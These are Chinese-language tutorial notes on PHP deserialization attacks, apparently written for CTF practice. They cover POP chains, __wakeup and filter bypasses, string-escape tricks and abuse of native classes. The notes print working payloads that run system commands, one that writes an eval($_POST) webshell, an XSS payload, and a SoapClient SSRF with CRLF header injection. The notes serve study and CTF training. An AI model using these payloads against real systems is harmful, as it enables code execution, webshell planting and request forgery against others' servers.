# 基础

## 原理

序列化其实就是将数据转化成一种可逆的数据结构，自然，逆向的过程就叫做反序列化

```
serialize 将对象格式化成有序的字符串
unserialize 将字符串还原成原来的对象
```

序列化作用：是方便数据的传输和存储，在PHP中，序列化和反序列化一般用做缓存，比如session缓存，cookie等

请记住，**序列化他只序列化属性**，不序列化方法，这个性质就引出了两个非常重要的话题

**(1)我们在反序列化的时候一定要保证在当前的作用域环境下有该类存在**

这里不得不扯出反序列化的问题，这里先简单说一下，反序列化就是将我们压缩格式化的对象还原成初始状态的过程（可以认为是解压缩的过程），因为我们没有序列化方法，因此在反序列化以后我们如果想正常使用这个对象的话我们必须要依托于这个类要在当前作用域存在的条件

**(2)我们在反序列化攻击的时候也就是依托类属性进行攻击**

因为没有序列化方法嘛，我们能控制的只有类的属性，因此类属性就是我们唯一的攻击入口，在我们的攻击流程中，我们就是要寻找合适的能被我们控制的属性，然后利用它本身的存在的方法，在基于属性被控制的情况下发动我们的发序列化攻击（这是我们攻击的核心思想，这里先借此机会抛出来，大家有一个印象）

## 简单例子

### 序列化

```php
<?php
header("content-type:text/html;charset=utf-8");  //设置编码
class ye1s{
   public  $v1;
   public  $v2=false;
   public  $v3=1;
   public  $v4="public";
   private $v5="private";
   protected $v6="protected";
}
$s=serialize(new ye1s());
echo $s;
//var_dump(unserialize($s));
```

输出为

O:4:"ye1s":6:{s:2:"v1";N;s:2:"v2";b:0;s:2:"v3";i:1;s:2:"v4";s:6:"public";s:8:"ye1sv5";s:7:"private";s:5:"*v6";s:9:"protected";}

### 反序列化

反序列化是将字符串转换成变量或对象的过程

```php
<?php
header("content-type:text/html;charset=utf-8");  //设置编码
class ye1s{
   public  $v1;
   public  $v2=false;
   public  $v3=1;
   public  $v4="public";
   private $v5="private";
   protected $v6="protected";
}
$s=serialize(new ye1s());
var_dump(unserialize($s));
```

输出为

```
object(ye1s)[1]
  public 'v1' => null
  public 'v2' => boolean false
  public 'v3' => int 1
  public 'v4' => string 'public' (length=6)
  private 'v5' => string 'private' (length=7)
  protected 'v6' => string 'protected' (length=9)
```

输出时一般需要**url编码**，若在本地存储更推荐采用base64编码的形式，避免**属性权限问题**导致不可见字符`\x00`的丢失，如：

```
echo serialize($a);
echo urlencode(serialize($a));
```

### 序列化时属性权限

<img src="图片\序列化结果1.png" alt="序列化结果1" style="zoom:67%;" />

**(1)Puiblic 权限：**

他的序列化规规矩矩，按照我们常规的思路，该是几个字符就是几个字符

**(2)Private 权限：**

私有属性序列化的时候格式是

```
%00类名%00属性名
```

**(3)Protected 权限：**

```
%00*%00属性名
```

再来观察下我们序列化后的字符串，看看不同权限的属性序列化后的不同

```
O:4:"ye1s":6:{s:2:"v1";N;s:2:"v2";b:0;s:2:"v3";i:1;s:2:"v4";s:6:"public";s:8:"ye1sv5";s:7:"private";s:5:"*v6";s:9:"protected";}
```

## 简单漏洞分析

### 魔术方法利用点分析

```
#魔术方法利用点分析：
触发：unserialize函数的变量可控，文件中存在可利用的类，类中有魔术方法：

__construct():     //构造函数，当对象new的时候会自动调用
__destruct()：     //析构函数当对象被销毁时会被自动调用
__wakeup():       //unserialize()时会被自动调用
__invoke():       //当尝试以调用函数的方法调用一个对象时，会被自动调用
__call():         //在对象上下文中调用不可访问的方法时触发
__callStatci():   //在静态上下文中调用不可访问的方法时触发
__get():         //用于从不可访问的属性读取数据
__set():         //用于将数据写入不可访问的属性
__isset():       //在不可访问的属性上调用isset()或empty()触发
__unset():       //在不可访问的属性上使用unset()时触发
__toString():    //把类当作字符串使用时触发
__sleep():       //serialize()函数会检查类中是否存在一个魔术方法__sleep() 如果存在，该方法会被优先调用
```

### 代码分析

```php
<?php
    class People {
    var $name = ''; 
    var $sex = '';
    var $age = 0;
    var $addr = '';

    // 魔术方法：__construct，指类在实例化的时候会，自动调用
    function __construct($name='张三', $sex='男', $age=30, $addr='成都高新区') {
        $this->name = $name;
        $this->sex = $sex;
        $this->age = $age;
        $this->addr = $addr;
        echo "正在初始化. <br/>";
    }

    // 魔术方法：__destruct，代码运行结束时，类的实例从内存中释放时，自动调用
    function __destruct() {
        echo "正在释放资源. <br/>";
    }

    // 魔术方法：__sleep，在类实例被序列化时，自动调用
    function __sleep() {
        echo "正在序列化. <br/>";
        // 返回一个由序列化类的属性名构成的数组
        return array('name', 'sex', 'age', 'addr');
    }

    // 魔术方法：__wakeup，在字符串被反序列化成对象时，自动调用
    // 反序列化时不会自动调用__construct，同时，调用完__wakeup后，仍然会调用__destruct
    function __wakeup() {
        echo "正在被反序列化. <br/>";
    }

    function getName() {
        echo $this->name . "<br/>";
    }
}
 $p1 = new People();         // 因为__construct的参数有默认值，所以实例化的时候可以不用给定参数值
 echo $p1->name . "<br/>";
 $p1->getName() . "<br/>";
 echo serialize($p1) . "<br/>";
?>
```

输出为：

```
正在初始化. 
张三
张三
正在序列化. 
O:6:"People":4:{s:4:"name";s:6:"张三";s:3:"sex";s:3:"男";s:3:"age";i:30;s:4:"addr";s:15:"成都高新区";}
正在释放资源. 
```

接下来我们试试反序列化攻击我们用POST提交一个序列化的字符串

```php
<?php
    class People {
    var $name = ''; 
    var $sex = '';
    var $age = 0;
    var $addr = '';

    // 魔术方法：__construct，指类在实例化的时候会，自动调用
    function __construct($name='张三', $sex='男', $age=30, $addr='成都高新区') {
        $this->name = $name;
        $this->sex = $sex;
        $this->age = $age;
        $this->addr = $addr;
        echo "正在初始化. <br/>";
    }

    // 魔术方法：__destruct，代码运行结束时，类的实例从内存中释放时，自动调用
    function __destruct() {
        echo "正在释放资源. <br/>";
    }

    // 魔术方法：__sleep，在类实例被序列化时，自动调用
    function __sleep() {
        echo "正在序列化. <br/>";
        // 返回一个由序列化类的属性名构成的数组
        return array('name', 'sex', 'age', 'addr');
    }

    // 魔术方法：__wakeup，在字符串被反序列化成对象时，自动调用
    // 反序列化时不会自动调用__construct，同时，调用完__wakeup后，仍然会调用__destruct
    function __wakeup() {
        echo "正在被反序列化. <br/>";
    }

    function getName() {
        echo $this->name . "<br/>";
    }
}
 // $source = 'O:6:"People":4:{s:4:"name";s:9:"张三峰";s:3:"sex";s:3:"男";s:3:"age";i:30;s:4:"addr";s:15:"成都高新区";}';

 $source = $_POST['source'];
 $p2 = unserialize($source);
 $p2->getName();
?>
```

我们用POST提交一个序列化后的字符串

```
source=O:6:"People":4:{s:4:"name";s:9:"张三峰";s:3:"sex";s:3:"男";s:3:"age";i:30;s:4:"addr";s:15:"成都高新区";}
```

发现 name 从张三 变成了 张三峰

<img src="图片\Snipaste_2023-02-04_19-35-53.png" alt="Snipaste_2023-02-04_19-35-53" style="zoom:67%;" />

### 简单题目尝鲜

```php
<?php
class Test {
    public $phone = '';
    var $ip = '';

    public function __wakeup () {
        $this->getPhone();
    }

    public function __destruct() {
        echo $this->getIp();
    }
    
    public function getPhone() {
        // echo $this->phone;
        @eval($this->phone);
    }

    public function getIp() {
        echo $this->ip;
    }
}
//$t =new Test();
//echo serialize($t);  //O:4:"Test":2:{s:5:"phone";s:0:"";s:2:"ip";s:0:"";}

$source = $_POST['source'];
$p2 = unserialize($source);
?>
```

我们该如何触发 getPhone() 方法中的 eval() 呢？注意魔术方法的触发时机，POP链构造如下

```php
<?php
header("content-type:text/html;charset=utf-8");  //设置编码

 class Test {
     public $phone = '';
     var $ip = '';
 }

 $t = new Test();
 $t->phone = 'system("whoami");';
 $t->ip  = '';
 echo serialize($t);
 ?>
```

```
source=O:4:"Test":2:{s:5:"phone";s:17:"system("whoami");";s:2:"ip";s:0:"";}
```

<img src="图片\Snipaste_2023-02-04_19-53-50.png" alt="Snipaste_2023-02-04_19-53-50" style="zoom:67%;" />

**通过这个简单的例子总结一下寻找 PHP 反序列化漏洞的方法或者说流程**

(1) 寻找 unserialize() 函数的参数是否有我们的可控点

(2) 寻找我们的反序列化的目标，重点寻找 存在 **wakeup() 或** destruct() 魔法函数的类

(3) **一层一层**地研究该类在魔法方法中使用的属性和属性调用的方法，看看是否有可控的属性能实现在当前调用的过程中触发的

(4) 找到我们要控制的属性了以后我们就将要用到的代码部分复制下来，然后构造序列化，发起攻击

### 题目巩固

#### 例一

```php
<?php

class Woniu {
    private $a;
    function __construct() {
        $this->a = new Test();
    }

    function __destruct() {
        $this->a->hello();
    }
}

class Test {
    function hello() {
        echo "Hello World.";
    }
}

class Vul {
    protected $data;
    function hello() {
        @eval($this->data);
    }

    // function __call($name, $args) {
    //     $this->hi();
    // }
}
unserialize($_GET['code']);
?>
```

流程分析，终点是  `class Vul---->hello()------>eval()`  ，这里直接看 POP 链

```php
<?php
class Woniu {
    private $a;
    function __construct() {
        $this->a = new Vul();
    }
}
class Vul {
    // protected $data = "phpinfo();";
    protected $data = "echo system('ipconfig');";
}

// echo serialize(new Woniu());
echo urlencode(serialize(new Woniu()));
// echo base64_encode(serialize(new Woniu()));
```

```
GET: ?code=O%3A5%3A%22Woniu%22%3A1%3A%7Bs%3A8%3A%22%00Woniu%00a%22%3BO%3A3%3A%22Vul%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00data%22%3Bs%3A24%3A%22echo+system%28%27ipconfig%27%29%3B%22%3B%7D%7D
```

<img src="图片\Snipaste_2023-02-04_20-12-59.png" alt="Snipaste_2023-02-04_20-12-59" style="zoom:80%;" />

#### 例二

```php
<?php
class Template {
    var $cacheFile = "cache.txt";
    var $template = "<div>Welcome back %s</div>";

    function __construct($data = null) {
        $data = $this->loadData($data);
        $this->render($data);
    }

    function loadData($data) {
        return unserialize($data); //触发反序列化
        //return [];
    }

    function createCache($file = null, $tpl = null) {
        $file = $file ?: $this->cacheFile;
        $tpl = $tpl ?: $this->template;
        file_put_contents($file, $tpl);  //终点，写shell
    }

    function render($data) {
        echo sprintf($this->template, htmlspecialchars($data['name']));  //此处为数组
    }

    function __destruct() {
        $this->createCache();
    }
}
new Template($_COOKIE['data']);
?>
```

POP链

```php
<?php
class Template{
    var $cacheFile = "../upload/shell2.php";
    var $template = '<?php @eval($_POST["gsl"]); ?>';
}
$t = new Template();
$a = array($t);
echo urlencode(serialize($a));
```

```
COOKIE: data=a%3A1%3A%7Bi%3A0%3BO%3A8%3A%22Template%22%3A2%3A%7Bs%3A9%3A%22cacheFile%22%3Bs%3A20%3A%22..%2Fupload%2Fshell2.php%22%3Bs%3A8%3A%22template%22%3Bs%3A30%3A%22%3C%3Fphp+%40eval%28%24_POST%5B%22gsl%22%5D%29%3B+%3F%3E%22%3B%7D%7D
```

<img src="图片\Snipaste_2023-02-04_20-46-18.png" alt="Snipaste_2023-02-04_20-46-18" style="zoom:67%;" />

写入 shell2.php

<img src="图片\Snipaste_2023-02-04_20-46-45.png" alt="Snipaste_2023-02-04_20-46-45" style="zoom:80%;" />

#### 例三

```php
<?php

class Tiger{
    public $string;
    protected $var;
    public function __toString(){
        return $this->string;
    }
    public function boss($value){
        @eval($value);   //这里是终点
    }
    public function __invoke(){
        $this->boss($this->var);
    }
}

class Lion{
    public $tail;
    public function __construct(){
        $this->tail = array();
    }
    public function __get($value){
        $function = $this->tail;
        return $function();
    }
}

class Monkey{
    public $head;
    public $hand;
    public function __construct($here="Zoo"){
        $this->head = $here;
        echo "Welcome to ".$this->head."<br>";
    }
    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->head)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Elephant{
    public $nose;
    public $nice;
    public function __construct($nice="nice"){
        $this->nice = $nice;
        echo $nice;
    }
    public function __toString(){
        return $this->nice->nose;
    }
}

if(isset($_GET['zoo'])){
    @unserialize($_GET['zoo']);
}
else{
    $a = new Monkey;
    echo "Hello!";
}
?>
```

POP链

```php
class Monkey{
     public $head;
     // public $hand;   // 此属性在整个POP链中用不到，可以不用序列化

     function __construct(){
         $this -> head = new Elephant();
     }
 }

 class Elephant{
     public $nice;

     function __construct(){
         $this -> nice = new Lion();
     }
 }

 class Lion{
     public $tail;

     function __construct(){
         $this -> tail = new Tiger();
     }
 }

 class Tiger{
     public $string;
     protected $var = 'phpinfo();';
 }

 // 从起点开始序列化
 $a = new Monkey();
 echo urlencode(serialize($a));
```

## 反序列化绕过小技巧

### php7.1+反序列化对类属性不敏感

我们前面说了如果变量前是protected，序列化结果会在变量名前加上x00*x00

但在特定版本7.1以上则对于类属性不敏感，比如下面的例子即使没有x00*x00也依然会输出abc

```php
<?php
class test{
    protected $a;
    public function __construct(){
        $this->a = 'abc';
    }
    public function  __destruct(){
        echo $this->a;
    }
}
unserialize('O:4:"test":1:{s:1:"a";s:3:"abc";}');
?>
```

### 绕过__wakeup(CVE-2016-7124)

> 版本：
>
>  PHP5 < 5.6.25
>
>  PHP7 < 7.0.10

利用方式：`序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行`

对于下面这样一个自定义类

```php
<?php
class test{
    public $a;
    public function __construct(){
        $this->a = 'abc';
    }
    public function __wakeup(){
        $this->a='666';
    }
    public function  __destruct(){
        echo $this->a;
    }
}
```

如果执行`unserialize('O:4:"test":1:{s:1:"a";s:3:"abc";}');`输出结果为`666`

而把对象属性个数的值增大执行`unserialize('O:4:"test":2:{s:1:"a";s:3:"abc";}');`输出结果为abc

### 绕过部分正则

`preg_match('/^O:\d+/')`匹配序列化字符串是否是对象字符串开头,这在曾经的CTF中也出过类似的考点

- ​          利用加号绕过（注意在url里传参时+要编码为%2B）
- ​          serialize(array(a ) ) ; / / a));//a));//a为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构)

```php
<?php
class test{
    public $a;
    public function __construct(){
        $this->a = 'abc';
    }
    public function  __destruct(){
        echo $this->a.PHP_EOL;
    }
}

function match($data){
    if (preg_match('/^O:\d+/',$data)){
        die('you lose!');
    }else{
        return $data;
    }
}
$a = 'O:4:"test":1:{s:1:"a";s:3:"abc";}';
// +号绕过
$b = str_replace('O:4','O:+4', $a);
unserialize(match($b));
// serialize(array($a));
unserialize('a:1:{i:0;O:4:"test":1:{s:1:"a";s:3:"abc";}}');
```

利用引用

```php
<?php
class test{
    public $a;
    public $b;
    public function __construct(){
        $this->a = 'abc';
        $this->b= &$this->a;
    }
    public function  __destruct(){

        if($this->a===$this->b){
            echo 666;
        }
    }
}
$a = serialize(new test());
```

上面这个例子将`$b`设置为`$a`的引用，可以使`$a`永远与`$b`相等

### 16进制绕过字符的过滤

```
O:4:"test":2:{s:4:"%00*%00a";s:3:"abc";s:7:"%00test%00b";s:3:"def";}
可以写成
O:4:"test":2:{S:4:"\00*\00\61";s:3:"abc";s:7:"%00test%00b";s:3:"def";}
```

表示字符类型的s大写时，会被当成16进制解析
一个例子

```php
<?php
class test{
    public $username;
    public function __construct(){
        $this->username = 'admin';
    }
    public function  __destruct(){
        echo 666;
    }
}
function check($data){
    if(stristr($data, 'username')!==False){
        echo("你绕不过！！".PHP_EOL);
    }
    else{
        return $data;
    }
}
// 未作处理前
$a = 'O:4:"test":1:{s:8:"username";s:5:"admin";}';
$a = check($a);
unserialize($a);
// 做处理后 \75是u的16进制
$a = 'O:4:"test":1:{S:8:"\\75sername";s:5:"admin";}';
$a = check($a);
unserialize($a);
```

### PHP反序列化字符逃逸

#### 情况1：过滤后字符变多

首先给出本地的php代码，很简单不做过多的解释，就是把反序列化后的一个x替换成为两个

```php
<?php
function change($str){
    return str_replace("x","xx",$str);
}
$name = $_GET['name'];
$age = "I am 11";
$arr = array($name,$age);
echo "反序列化字符串：";
var_dump(serialize($arr));
echo "<br/>";
echo "过滤后:";
$old = change(serialize($arr));
$new = unserialize($old);
var_dump($new);
echo "<br/>此时，age=$new[1]";
```

正常情况,传入`name=mao`

<img src="图片\20210203104830625.png" alt="20210203104830625" style="zoom:80%;" />

如果此时多传入一个x的话会怎样，毫无疑问反序列化失败，由于溢出(s本来是4结果多了一个字符出来)，我们可以利用这一点实现字符串逃逸

<img src="图片\20210203104840221.png" alt="20210203104840221" style="zoom:80%;" />

首先来看看结果，再来讲解

<img src="图片\20210203104847637.png" alt="20210203104847637" style="zoom:80%;" />

我们传入`name=maoxxxxxxxxxxxxxxxxxxxx";i:1;s:6:"woaini";}";i:1;s:6:"woaini";}`这一部分一共二十个字符

由于一个x会被替换为两个，我们输入了一共20个x，现在是40个，多出来的20个x其实取代了我们的这二十个字符`";i:1;s:6:"woaini";}`，从而造成`";i:1;s:6:"woaini";}`的溢出，而`"`闭合了前串，使得我们的字符串成功逃逸，可以被反序列化，输出woaini

最后的`;}`闭合反序列化全过程导致原来的`";i:1;s:7:"I am 11";}"`被舍弃，不影响反序列化过程`

#### 情况2：过滤后字符变少

老规矩先上代码,很简单不做过多的解释，就是把反序列化后的两个x替换成为一个

```php
<?php
function change($str){
    return str_replace("xx","x",$str);
}
$arr['name'] = $_GET['name'];
$arr['age'] = $_GET['age'];
echo "反序列化字符串：";
var_dump(serialize($arr));
echo "<br/>";
echo "过滤后:";
$old = change(serialize($arr));
var_dump($old);
echo "<br/>";
$new = unserialize($old);
var_dump($new);
echo "<br/>此时，age=";
echo $new['age'];
```

正常情况传入`name=mao&age=11`的结果

<img src="图片\20210203104859195.png" alt="20210203104859195" style="zoom:80%;" />

老规矩看看最后构造的结果，再继续讲解

<img src="图片\20210203104905443.png" alt="20210203104905443" style="zoom:80%;" />

简单来说，就是前面少了一半，导致后面的字符被吃掉，从而执行了我们后面的代码；
我们来看，这部分是age序列化后的结果

```
s:3:"age";s:28:"11";s:3:"age";s:6:"woaini";}"
```

由于前面是40个x所以导致少了20个字符，所以需要后面来补上，`";s:3:"age";s:28:"11`这一部分刚好20个，后面由于有`"`闭合了前面因此后面的参数就可以由我们自定义执行了

# 原生类

https://www.anquanke.com/post/id/264823#h3-10

## 安全客文章

1.读取目录/文件（内容）

2.构造XSS

3.Error绕过

4.SSRF

5.获取注释内容

这里本人只列出了在CTF比赛中比较常见的PHP原生类利用方式

### 1.读取目录/文件（内容）

**1.1.查看文件类**

这里介绍两个原生类

**[Directorylterator](https://www.php.net/manual/zh/class.directoryiterator.php)**

(PHP 5, PHP 7, PHP 8)

**[Filesystemlterator](https://www.php.net/manual/zh/class.filesystemiterator.php)**

(PHP 5 >= 5.3.0, PHP 7, PHP 8)

当然从官方文档我们不难看出两个原生类的关系

<img src="图片\t019dfd53b1d2f85773.png" alt="img" style="zoom:80%;" />

即继承关系
查看官方文档可以发现在该类下有一个__toString()方法

<img src="图片\t01b5bf2423deb693e0.png" alt="img" style="zoom:80%;" />

而这个__toString()方法可以获取字符串形式的文件名

这边起一个docker环境本地测试一下

测试代码：

```php
<?php
highlight_file(__file__);
$dir = $_GET['ki10Moc'];
$a = new DirectoryIterator($dir);
foreach($a as $f){
    echo($f->__toString().'<br>');
}
?>
```

可以直接配合glob伪协议来读取目录

下面看一下效果图

<img src="图片\t01e854070ea6d3f060.png" alt="img" style="zoom:80%;" />

<img src="图片\t01ea563b5212ce6621.png" alt="img" style="zoom:80%;" />

<img src="图片\t01a8ec6eddafe4f1e0.png" alt="img" style="zoom:80%;" />

<img src="图片\t01aa5e3e9a6fef82ae.png" alt="img" style="zoom:80%;" />

这种姿势也可以无视open_basedir的限制

并且从图中就可以看出这两个原生类的些许区别了，Filesystemlterator会以绝路路径的形式展现，而DirectoryIterator仅显示出当前目录下的文件信息

这两个类同样也有一句话形式payload：

DirectoryIterator:

```php
$a = new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().'<br>');}
```

FilesystemIterator:

```php
$a = new FilesystemIterator("glob:///*");foreach($a as $f){echo($f->__toString().'<br>');}
```

这里简单测试一下

**CTFshow web74**

```php
error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
}else{
    highlight_file(__FILE__);
}
?>
```

传入payload

```php
c=$a = new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().'<br>');}exit();
```

得到

<img src="图片\t012a87e4f6d1978130.png" alt="img" style="zoom:80%;" />

包含一下即可

```php
c=include('/flagx.txt');exit();
```

**[Globlterator](https://www.php.net/manual/zh/class.globiterator.php)**

(PHP 5 >= 5.3.0, PHP 7, PHP 8)

与前两个类的作用相似，GlobIterator 类也是可以遍历一个文件目录，使用方法与前两个类也基本相似。但与上面略不同的是其行为类似于 glob()，可以通过模式匹配来寻找文件路径。

既然遍历一个文件系统性为类似于glob()

所以在这个类中不需要配合glob伪协议，可以直接使用

看了一下文档发现该原生类是继承FilesystemIterator的，所以也是以绝对路径显示的

<img src="图片\t01e27b011167c56ff5.png" alt="img" style="zoom:80%;" />

测试代码

```php
<?php
highlight_file(__file__);
$dir = $_GET['ki10Moc'];
$a = new GlobIterator($dir);
foreach($a as $f){
    echo($f->__toString().'<br>');
}
?>
```

<img src="图片\t01cf7107806fb6f656.png" alt="img" style="zoom:80%;" />

传参直接给路径就行

**1.2读取文件内容**

[SplFileInfo](https://www.php.net/manual/en/class.splfileinfo.php)
(PHP 5 >= 5.1.2, PHP 7, PHP 8)

> SplFileInfo类为单个文件的信息提供了高级的面向对象接口
> SplFileInfo::__toString — Returns the path to the file as a string //将文件路径作为字符串返回

<img src="图片\t015f42e4c3564e969e.png" alt="img" style="zoom:80%;" />

测试代码：

```php
<?php
highlight_file(__file__);
$context = new SplFileObject('/etc/passwd');
foreach($context as $f){
    echo($f);
}
```

<img src="图片\t0113810294b306ce19.png" alt="img" style="zoom:80%;" />

这里提一个小trick
PHP的动态函数调用

举个例子

来看一下下面这段代码展示效果

```php
<?php
echo ('system')('dir');
?>
```

<img src="图片\t014f29c5b5d1b8e6fe.png" alt="img" style="zoom:80%;" />

发现其实就是调用了system函数执行了dir

那这里给出一个Demo，供大家参考

```php
class Example{
    public $class;
    public $data;
    public function __construct()
    {
        $this->class = "FilesystemIterator";
        $this->data = "/";
    }
//    public function __destruct()
//    {
//        echo new $this->class($this->data);
//    }
}
```

若是在反序列化题目，或者更多是在pop链构造的题目中见到形如
$this->class($this->data)
那就可以__destruct()方法传入类名和参数来构造我们的恶意paylaod

### 2.构造XSS

**[Error](https://www.php.net/manual/zh/class.error.php) /[Exception](https://www.php.net/manual/zh/class.exception.php)**

官方文档显示两个内置类的使用条件：
Error：用于PHP7、8，开启报错。
Exceotion：用于PHP5、7、8，开启报错。

Error是所有PHP内部错误类的基类，该类是在PHP 7.0.0 中开始引入的

PHP7中，可以在echo时（PHP对象被当做字符串或使用）触发__toString，来构造XSS。

从官方文档中可以看出，这两个原生类的属性相同，都是对message、code、file、line的信息处理，并调用__toString()方法将异常的对象转换为字符串

<img src="图片\t019c098d8e8c3676e0.png" alt="img" style="zoom:80%;" />

测试代码：

```php
<?php
highlight_file(__file__);
$a = unserialize($_GET['k']);
echo $a;
?>
```

利用Exception::__toString方法来构造xss

```php
<?php
$a = new Exception("<script>alert('U_F1ind_Me')</script>");//new Error
$b = serialize($a);
echo urlencode($b);
?>
//O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A36%3A%22%3Cscript%3Ealert%28%27U_F1ind_Me%27%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A34%3A%22D%3A%5CPHPstorm%5CPHPstormcode%5Cerror.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D
```

<img src="图片\t019d7ea9c7cafe9c6d.png" alt="img" style="zoom:80%;" />

### 3.绕过哈希

还是这两个类

**[Error](https://www.php.net/manual/zh/class.error.php) /[Exception](https://www.php.net/manual/zh/class.exception.php)**

这里就用到我们上面提到的四个属性

message   错误消息内容

code    错误代码

file   抛出错误的文件名

line   抛出错误的行数

**注：这里会返回错误的行号，所以两个不同的对象在绕过hash函数时需要在同一行中。**

```php
<?php
try {
    throw new Error("Some error message");
} catch(Error $e) {
    echo $e;
}
?>
```

来看一下报错信息

```shell
Error: Some error message in L:\PHPstorm\PHPstormcode\Error.php:3 Stack trace: #0 {main}
```

这里我们可以再来做个小测试
来判断该原生类返回的信息是否相同

测试代码：

```php
<?php
$a = new Error("payload",1);$b = new Error("payload",2);
var_dump($a === $b);//对a和b进行判断
echo '<br>';
echo $a;//输出a
echo '<br>';
echo $b;//输出b
echo '<br>';
```

来看一下结果

```php
bool(false)
Error: payload in D:\PHPstorm\PHPstormcode\errormd5.php:2 Stack trace: #0 {main}
Error: payload in D:\PHPstorm\PHPstormcode\errormd5.php:2 Stack trace: #0 {main}
```

<img src="图片\t010d6287b28b54d992.png" alt="img" style="zoom:67%;" />

完全一样！！！

**例题 [2020 极客大挑战]Greatphp**

这个题目是个经典的哈希值判断绕过，也是这个题目让我认识了Error

源码：

```php
<?php
error_reporting(0);
class SYCLOVER {
    public $syc;
    public $lover;

    public function __wakeup(){
        if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
           if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){
               eval($this->syc);
           } else {
               die("Try Hard !!");
           }

        }
    }
}

if (isset($_GET['great'])){
    unserialize($_GET['great']);
} else {
    highlight_file(__FILE__);
}

?>
```

可以看出这里反序列化后直接调用__wakeup()方法，该方法会对两个成员变量进行判断，两者不相等，md5加密后强等于，sha1加密后强等于。

这里我们就使用Error类即可绕过。

关于题解网上有许多资源，这里就不再赘述。

### 4.SSRF

**[SoapClient](https://www.php.net/manual/en/class.soapclient.php)**

(PHP 5, PHP 7, PHP 8)

这里最早是在CTFshow的反序列化遇到的，当时都没听说过原生类，更不知道原生类还能SSRF,本类介绍最后来做一下这道题目

PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。

我的理解就是这个原生类大概类似Python中的requests库，可以与浏览器之间交互，并向其发送报文

函数形式：

```php
public SoapClient :: SoapClient(mixed $wsdl [，array $options ])
```

第一个参数为指明是否为wsdl模式，为null则为非wsdl模式

wsdl，就是一个xml格式的文档，用于描述Web Server的定义

第二个参数为array，wsdl模式下可选；非wsdl模式下，需要设置ilocation和uri，location就是发送SOAP服务器的URL，uri是服务的命名空间

老规矩，还是本地测试一下，比翻博客更容易理解

测试代码：

```php
<?php
$a = new SoapClient(null,array('location'=>'http://192.168.61.140:2021/ki10Moc', 'uri'=>'http://192.168.61.140:2021'));
$b = serialize($a);
echo $b;
$c = unserialize($b);
$c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
?>
```

本地也起个端口来看一下回显

<img src="图片\t0160b17c875f784f67.png" alt="img" style="zoom:80%;" />

从图中可以看到这就是一次报文的发送，记录着HTTP的一些header信息

试着注入Cookie看一下

```php
<?php
$target = 'http://192.168.61.140:2023/';
$a = new SoapClient(null,array('location' => $target, 'user_agent' => "ki10Moc\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4", 'uri' => 'test'));
$b = serialize($a);
echo $b;
$c = unserialize($b);
$c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
?>
```

从图中可以看到我们Use-Agent的信息已经替换成了ki10Moc

<img src="图片\t01611ec84158368fa4.png" alt="img" style="zoom:80%;" />

在学习的时候我突然想到暑假看到一个一篇关于CRLF攻击的文章
那在这里我们可不可以将两者结合起来，构造恶意的payload头部信息

另外，通过http的报文信息可以发现Content-Type在UA头的下面

<img src="图片\t01d7c8585d2e32d053.png" alt="img" style="zoom:80%;" />

请求的报文由请求头和body组成，请求头内部和body换行都是一个\r\n，也就是一个换行符(\n)一个回车符(\r)，而两者之间是用两组换行符和回车符隔开，即\r\n\r\n

这里就是用CRLF(回车+换行的简称)注入一些恶意代码行执行。

[这里可以看看wooyun的关于CRLF介绍](https://wooyun.js.org/drops/CRLF Injection漏洞的利用与实例分析.html)

那么下面我们就来尝试一下

测试代码：

```php
<?php
$target = 'http://192.168.27.173:2023/';
$post_data = 'data=ki10Moc';
$headers = array(
    'X-Forwarded-For: 127.0.0.1',
    'Cookie: PHPSESSID=8asIKRJGI2493324gfsjkk958'
);
$a = new SoapClient(null,array('location' => $target,'user_agent'=>'Happy^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '. (string)strlen($post_data).'^^^^'.$post_data,'uri'=>'ki10Moc'));
$b = serialize($a);
$b = str_replace('^^',"\r\n",$b);
echo $b;
$c = unserialize($b);
$c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
?>
```

<img src="图片\t012fd70f87d33fbd7b.png" alt="img" style="zoom:80%;" />

返回的信息

```php
Connection from 192.168.27.1 62590 received!
POST / HTTP/1.1
Host: 192.168.27.173:2023
Connection: Keep-Alive
User-Agent: Happy
Content-Type: application/x-www-form-urlencoded
X-Forwarded-For: 127.0.0.1
Cookie: PHPSESSID=8asIKRJGI2493324gfsjkk958
Content-Length: 12

data=ki10Moc
Content-Type: text/xml; charset=utf-8
SOAPAction: "ki10Moc#a"
Content-Length: 368
```

从这里我们可以看到我们伪造的XFF头，注入的Cookie和UA头都是可以成功实现的

那么最后就来看一下让我认识Soapclint这个原生类的题目

**CTFshow web259**

源码：

```php
$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
array_pop($xff);
$ip = array_pop($xff);


if($ip!=='127.0.0.1'){
    die('error');
}else{
    $token = $_POST['token'];
    if($token=='ctfshow'){
        file_put_contents('flag.txt',$flag);
    }
}
```

